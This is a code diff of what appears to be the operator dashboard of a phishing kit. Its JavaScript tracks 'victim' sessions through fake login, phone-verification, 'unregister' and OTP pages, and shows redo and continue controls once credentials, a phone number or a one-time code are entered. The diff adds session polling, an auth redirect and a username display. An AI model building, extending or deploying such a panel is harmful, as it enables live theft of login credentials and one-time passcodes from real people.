@@ -96,7 +96,6 @@
     #empty { text-align: center; color: #888; padding: 2rem 0; }
     @media (max-width: 900px) { .stats { grid-template-columns: 1fr; } }
 
-    /* Alert/Toast Styles */
     #alert-container {
       position: fixed;
       top: 20px;
@@ -157,7 +156,6 @@
       to { opacity: 0; transform: translateX(20px); }
     }
 
-    /* Status Badge Styles */
     .status-badge {
       display: inline-flex;
       flex-direction: column;
@@ -188,7 +186,7 @@
 <body>
   <div id="alert-container"></div>
 
-  <div class="greet-bar">Hello, <span id="userName">admin</span>! • <span id="clock">--:-- --</span></div>
+  <div class="greet-bar">Hello, <span id="userName">...</span>! • <span id="clock">--:-- --</span></div>
 
   <div class="dashboard">
     <div class="grid stats">
@@ -298,7 +296,6 @@
     function getActionButtons(s) {
       let html = '<div class="action-btns">';
       
-      // Manage button (always show)
       html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details">
         <img src="/images/description-svgrepo-com.svg" alt="Manage">
       </button>`;
@@ -306,35 +303,26 @@
       let showRedo = false;
       let showCont = false;
       
-      // Logic based on current page and whether info was entered on THAT page
       if (s.page === 'index.html') {
-        // LOGIN page: show buttons only after credentials entered
         if (s.entered) {
           showRedo = true;
           showCont = true;
         }
       } else if (s.page === 'verify.html') {
-        // PHONE page: show buttons only after phone entered
         if (s.phone) {
           showRedo = true;
           showCont = true;
         }
       } else if (s.page === 'unregister.html') {
-        // UNREGISTER page: show continue only after clicked, never show redo
         if (s.unregisterClicked) {
           showCont = true;
           showRedo = false;
         }
       } else if (s.page === 'otp.html') {
-        // OTP page: show buttons only after OTP entered
         if (s.otp) {
           showRedo = true;
           showCont = true;
         }
-      } else if (s.page === 'success') {
-        // Success page: no buttons
-        showRedo = false;
-        showCont = false;
       }
       
       if (showCont) {
@@ -353,7 +341,6 @@
       return html;
     }
 
-    /* ----------  ALERT SYSTEM  ---------- */
     function showAlert(type, title, description, victimNum) {
       const container = qs('#alert-container');
       const alert = document.createElement('div');
@@ -387,7 +374,6 @@
       setTimeout(() => alert.remove(), 5000);
     }
 
-    /* ----------  CHECK FOR CHANGES & ALERT  ---------- */
     function checkChanges(newSessions) {
       newSessions.forEach(s => {
         const old = lastSessions.get(s.sid);
@@ -483,11 +469,47 @@
 
     let jsonData = {};
     async function load(){
-      jsonData = await fetch('/api/panel').then(r=>r.json());
-      checkChanges(jsonData.sessions);
-      render(jsonData);
+      try {
+        const res = await fetch('/api/panel');
+        
+        if (res.status === 401) {
+          window.location.href = '/panel';
+          return;
+        }
+        
+        jsonData = await res.json();
+        
+        if (jsonData.username) {
+          qs('#userName').textContent = jsonData.username;
+        }
+        
+        checkChanges(jsonData.sessions);
+        render(jsonData);
+      } catch (e) {
+        console.error('Load error:', e);
+        window.location.href = '/panel';
+      }
     }
-    load(); setInterval(load,2000);
+    
+    async function getUserInfo() {
+      try {
+        const res = await fetch('/api/user');
+        if (res.status === 401) {
+          window.location.href = '/panel';
+          return;
+        }
+        const data = await res.json();
+        if (data.username) {
+          qs('#userName').textContent = data.username;
+        }
+      } catch (e) {
+        console.error('User info error:', e);
+      }
+    }
+    
+    getUserInfo();
+    load(); 
+    setInterval(load, 2000);
   </script>
 </body>
 </html>
